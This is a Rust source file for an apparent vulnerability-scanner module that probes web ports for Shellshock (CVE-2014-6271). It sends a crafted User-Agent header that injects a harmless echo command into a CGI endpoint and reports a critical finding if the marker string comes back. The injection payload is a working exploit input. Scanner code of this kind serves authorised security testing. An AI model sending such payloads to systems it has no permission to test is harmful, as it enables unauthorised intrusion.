use async_trait::async_trait;
use std::net::IpAddr;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::time::{timeout, Duration};

use crate::engine::{Checker, VulnResult, VulnSeverity};

pub struct Shellshock;

#[async_trait]
impl Checker for Shellshock {
    fn name(&self) -> &'static str {
        "shellshock"
    }

    fn ports(&self) -> &'static [u16] {
        &[80, 443, 8080, 8443]
    }

    async fn check(&self, ip: IpAddr, port: u16) -> VulnResult {
        let addr = format!("{}:{}", ip, port);
        let Ok(mut stream) = timeout(Duration::from_secs(5), TcpStream::connect(&addr))
            .await
            .ok()
            .and_then(|r| r.ok())
        else {
            return VulnResult::safe(self.name());
        };

        // CVE-2014-6271: inject shellshock payload in User-Agent header
        let payload = b"GET /cgi-bin/test.cgi HTTP/1.0\r\nUser-Agent: () { :;}; echo Content-Type: text/plain; echo; echo SHELLSHOCK_VULNERABLE\r\nHost: test\r\n\r\n";
        if stream.write_all(payload).await.is_err() {
            return VulnResult::safe(self.name());
        }

        let mut buf = [0u8; 1024];
        let Ok(Ok(n)) = timeout(Duration::from_secs(3), stream.read(&mut buf)).await else {
            return VulnResult::safe(self.name());
        };

        let resp = String::from_utf8_lossy(&buf[..n]);
        if resp.contains("SHELLSHOCK_VULNERABLE") {
            VulnResult::vuln(
                self.name(),
                VulnSeverity::Critical,
                format!("Shellshock (CVE-2014-6271) confirmed on {}:{}", ip, port),
            )
            .with_cve("CVE-2014-6271")
        } else {
            VulnResult::safe(self.name())
        }
    }
}
